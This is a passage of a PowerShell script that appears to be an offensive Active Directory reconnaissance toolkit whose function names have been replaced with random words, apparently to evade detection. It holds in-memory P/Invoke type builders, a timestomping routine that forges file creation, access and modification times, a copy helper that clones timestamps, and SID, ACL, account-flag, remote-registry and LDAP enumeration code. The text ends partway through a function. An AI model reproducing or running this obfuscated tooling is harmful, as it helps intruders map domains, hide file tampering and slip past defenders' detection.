











function mewed
{


    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}




function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function comedowns
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {

            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)


            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }


            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function overthrows
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    ForEach ($Key in $EnumElements.Keys)
    {

        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}




function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function Matthew
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)




    ForEach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    ForEach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }



    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()

    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)



    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}








function misconducted {

    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True,
        ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject]
        $InputObject,

        [Parameter(Mandatory=$True, Position=0)]
        [Alias('PSPath')]
        [String]
        $OutFile
    )

    process {
        
        $ObjectCSV = $InputObject | ConvertTo-Csv -NoTypeInformation


        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex';
        $Null = $Mutex.WaitOne()

        if (Test-Path -Path $OutFile) {

            $ObjectCSV | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
        }
        else {
            $ObjectCSV | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
        }

        $Mutex.ReleaseMutex()
    }
}



function curdles {

    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (

        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $FilePath,

        [Parameter(ParameterSetName = 'Touch')]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $OldFilePath,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,

        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )


    function smocking {

        param($OldFileName)

        if (!(Test-Path -Path $OldFileName)) {Throw 'File Not Found'}
        $FileInfoObject = (Get-Item $OldFileName)

        $ObjectProperties = @{'Modified' = ($FileInfoObject.LastWriteTime);
                              'Accessed' = ($FileInfoObject.LastAccessTime);
                              'Created' = ($FileInfoObject.CreationTime)};
        $ResultObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Return $ResultObject
    }

    $FileInfoObject = (Get-Item -Path $FilePath)

    if ($PSBoundParameters['AllMacAttributes']) {
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }

    if ($PSBoundParameters['OldFilePath']) {
        $CopyFileMac = (smocking $OldFilePath)
        $Modified = $CopyFileMac.Modified
        $Accessed = $CopyFileMac.Accessed
        $Created = $CopyFileMac.Created
    }

    if ($Modified) {$FileInfoObject.LastWriteTime = $Modified}
    if ($Accessed) {$FileInfoObject.LastAccessTime = $Accessed}
    if ($Created) {$FileInfoObject.CreationTime = $Created}

    Return (smocking $FilePath)
}


function duplex {


    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $SourceFile,

        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DestFile
    )


    curdles -FilePath $SourceFile -OldFilePath $DestFile


    Copy-Item -Path $SourceFile -Destination $DestFile
}


function cab {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ''
    )
    process {
        try {

            $Results = @(([Net.Dns]::GetHostEntry($ComputerName)).AddressList)

            if ($Results.Count -ne 0) {
                ForEach ($Result in $Results) {

                    if ($Result.AddressFamily -eq 'InterNetwork') {
                        $Result.IPAddressToString
                    }
                }
            }
        }
        catch {
            Write-Verbose -Message 'Could not resolve host to an IP Address.'
        }
    }
    end {}
}


function fête {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $ObjectName,

        [String]
        $Domain = (Clemens).Name
    )

    process {
        
        $ObjectName = $ObjectName -replace "/","\"
        
        if($ObjectName.contains("\")) {

            $Domain = $ObjectName.split("\")[0]
            $ObjectName = $ObjectName.split("\")[1]
        }

        try {
            $Obj = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))
            $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose "Invalid object/name: $Domain\$ObjectName"
            $Null
        }
    }
}


function baffled {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )

    process {
        try {
            $SID2 = $SID.trim('*')



            Switch ($SID2)
            {
                'S-1-0'         { 'Null Authority' }
                'S-1-0-0'       { 'Nobody' }
                'S-1-1'         { 'World Authority' }
                'S-1-1-0'       { 'Everyone' }
                'S-1-2'         { 'Local Authority' }
                'S-1-2-0'       { 'Local' }
                'S-1-2-1'       { 'Console Logon ' }
                'S-1-3'         { 'Creator Authority' }
                'S-1-3-0'       { 'Creator Owner' }
                'S-1-3-1'       { 'Creator Group' }
                'S-1-3-2'       { 'Creator Owner Server' }
                'S-1-3-3'       { 'Creator Group Server' }
                'S-1-3-4'       { 'Owner Rights' }
                'S-1-4'         { 'Non-unique Authority' }
                'S-1-5'         { 'NT Authority' }
                'S-1-5-1'       { 'Dialup' }
                'S-1-5-2'       { 'Network' }
                'S-1-5-3'       { 'Batch' }
                'S-1-5-4'       { 'Interactive' }
                'S-1-5-6'       { 'Service' }
                'S-1-5-7'       { 'Anonymous' }
                'S-1-5-8'       { 'Proxy' }
                'S-1-5-9'       { 'Enterprise Domain Controllers' }
                'S-1-5-10'      { 'Principal Self' }
                'S-1-5-11'      { 'Authenticated Users' }
                'S-1-5-12'      { 'Restricted Code' }
                'S-1-5-13'      { 'Terminal Server Users' }
                'S-1-5-14'      { 'Remote Interactive Logon' }
                'S-1-5-15'      { 'This Organization ' }
                'S-1-5-17'      { 'This Organization ' }
                'S-1-5-18'      { 'Local System' }
                'S-1-5-19'      { 'NT Authority' }
                'S-1-5-20'      { 'NT Authority' }
                'S-1-5-80-0'    { 'All Services ' }
                'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                'S-1-5-32-545'  { 'BUILTIN\Users' }
                'S-1-5-32-546'  { 'BUILTIN\Guests' }
                'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                Default { 
                    $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                    $Obj.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {

            $SID
        }
    }
}


function sires {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $ObjectName
    )

    process {

        $ObjectName = $ObjectName -replace "/","\"
        
        if($ObjectName.contains("\")) {

            $Domain = $ObjectName.split("\")[0]
        }


        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Object.GetType().InvokeMember($Method, "InvokeMethod", $Null, $Object, $Parameters)
            if ( $Output ) { $Output }
        }
        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, "SetProperty", $Null, $Object, $Parameters)
        }

        $Translate = New-Object -ComObject NameTranslate

        try {
            Invoke-Method $Translate "Init" (1, $Domain)
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            Write-Debug "Error with translate init in sires: $_"
        }

        Set-Property $Translate "ChaseReferral" (0x60)

        try {
            Invoke-Method $Translate "Set" (3, $ObjectName)
            (Invoke-Method $Translate "Get" (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            Write-Debug "Error with translate Set/Get in sires: $_"
        }
    }
}


function lifelike {


    [CmdletBinding()]
    param(
        [String] $ObjectName
    )

    $Domain = ($ObjectName -split "@")[1]

    $ObjectName = $ObjectName -replace "/","\"


    function Invoke-Method([__ComObject] $object, [String] $method, $parameters) {
        $output = $object.GetType().InvokeMember($method, "InvokeMethod", $NULL, $object, $parameters)
        if ( $output ) { $output }
    }
    function Set-Property([__ComObject] $object, [String] $property, $parameters) {
        [Void] $object.GetType().InvokeMember($property, "SetProperty", $NULL, $object, $parameters)
    }

    $Translate = New-Object -comobject NameTranslate

    try {
        Invoke-Method $Translate "Init" (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { }

    Set-Property $Translate "ChaseReferral" (0x60)

    try {
        Invoke-Method $Translate "Set" (5, $ObjectName)
        (Invoke-Method $Translate "Get" (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { $_ }
}


function Mohicans {

    
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $Value,

        [Switch]
        $ShowAll
    )

    begin {


        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)

    }

    process {

        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if($Value -is [Int]) {
            $IntValue = $Value
        }

        if ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $IntValue = $Value.useraccountcontrol
            }
        }

        if($IntValue) {

            if($ShowAll) {
                foreach ($UACValue in $UACValues.GetEnumerator()) {
                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                        $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                    }
                    else {
                        $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                    }
                }
            }
            else {
                foreach ($UACValue in $UACValues.GetEnumerator()) {
                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                        $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                    }
                }                
            }
        }

        $ResultUACValues
    }
}


function epaulets {

    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $ENV:COMPUTERNAME
    )

    process {
        try {
            $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)
            $RegKey = $Reg.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
            $ProxyServer = $RegKey.GetValue('ProxyServer')
            $AutoConfigURL = $RegKey.GetValue('AutoConfigURL')

            if($AutoConfigURL -and ($AutoConfigURL -ne "")) {
                try {
                    $Wpad = (New-Object Net.Webclient).DownloadString($AutoConfigURL)
                }
                catch {
                    $Wpad = ""
                }
            }
            else {
                $Wpad = ""
            }
            
            if($ProxyServer -or $AutoConfigUrl) {

                $Properties = @{
                    'ProxyServer' = $ProxyServer
                    'AutoConfigURL' = $AutoConfigURL
                    'Wpad' = $Wpad
                }
                
                New-Object -TypeName PSObject -Property $Properties
            }
            else {
                Write-Warning "No proxy settings found for $ComputerName"
            }
        }
        catch {
            Write-Warning "Error enumerating proxy settings for $ComputerName"
        }
    }
}


function feldspar {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [string]
        $Path,

        [Switch]
        $Recurse
    )

    begin {

        function Sykes {



            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )

            $AccessMask = @{
              [uint32]'0x80000000' = 'GenericRead'
              [uint32]'0x40000000' = 'GenericWrite'
              [uint32]'0x20000000' = 'GenericExecute'
              [uint32]'0x10000000' = 'GenericAll'
              [uint32]'0x02000000' = 'MaximumAllowed'
              [uint32]'0x01000000' = 'AccessSystemSecurity'
              [uint32]'0x00100000' = 'Synchronize'
              [uint32]'0x00080000' = 'WriteOwner'
              [uint32]'0x00040000' = 'WriteDAC'
              [uint32]'0x00020000' = 'ReadControl'
              [uint32]'0x00010000' = 'Delete'
              [uint32]'0x00000100' = 'WriteAttributes'
              [uint32]'0x00000080' = 'ReadAttributes'
              [uint32]'0x00000040' = 'DeleteChild'
              [uint32]'0x00000020' = 'Execute/Traverse'
              [uint32]'0x00000010' = 'WriteExtendedAttributes'
              [uint32]'0x00000008' = 'ReadExtendedAttributes'
              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
              [uint32]'0x00000002' = 'WriteData/AddFile'
              [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $SimplePermissions = @{
              [uint32]'0x1f01ff' = 'FullControl'
              [uint32]'0x0301bf' = 'Modify'
              [uint32]'0x0200a9' = 'ReadAndExecute'
              [uint32]'0x02019f' = 'ReadAndWrite'
              [uint32]'0x020089' = 'Read'
              [uint32]'0x000116' = 'Write'
            }

            $Permissions = @()


            $Permissions += $SimplePermissions.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }


            $Permissions += $AccessMask.Keys |
                            ? { $FSR -band $_ } |
                            % { $AccessMask[$_] }

            ($Permissions | ?{$_}) -join ","
        }
    }

    process {

        try {
            $ACL = Get-Acl -Path $Path

            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {

                $Names = @()
                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {
                    $Object = Wanda -SID $_.IdentityReference
                    $Names = @()
                    $SIDs = @($Object.objectsid)

                    if ($Recurse -and ($Object.samAccountType -ne "805306368")) {
                        $SIDs += warding -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                    }

                    $SIDs | ForEach-Object {
                        $Names += ,@($_, (baffled $_))
                    }
                }
                else {
                    $Names += ,@($_.IdentityReference.Value, (baffled $_.IdentityReference.Value))
                }

                ForEach($Name in $Names) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $Path
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Sykes -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name[1]
                    $Out | Add-Member Noteproperty 'IdentitySID' $Name[0]
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}


function halting {



    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        $Object
    )
    process {
        if($Object) {
            if ( [bool]($Object.PSobject.Properties.name -match "dnshostname") ) {

                $Object.dnshostname
            }
            elseif ( [bool]($Object.PSobject.Properties.name -match "name") ) {

                $Object.name
            }
            else {

                $Object
            }
        }
        else {
            return $Null
        }
    }
}


function Sunkist {

    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {

            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {

            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {

            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {

                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {

            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $ObjectProperties
}









function Garvey {


    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if(!$Domain) {
        $Domain = (Clemens).name
    }
    else {
        if(!$DomainController) {
            try {


                $DomainController = ((Clemens).PdcRoleOwner).Name
            }
            catch {
                throw "Garvey: Error in retrieving PDC for current domain"
            }
        }
    }

    $SearchString = "LDAP://"

    if($DomainController) {
        $SearchString += $DomainController + "/"
    }
    if($ADSprefix) {
        $SearchString += $ADSprefix + ","
    }

    if($ADSpath) {
        if($ADSpath -like "GC://*") {

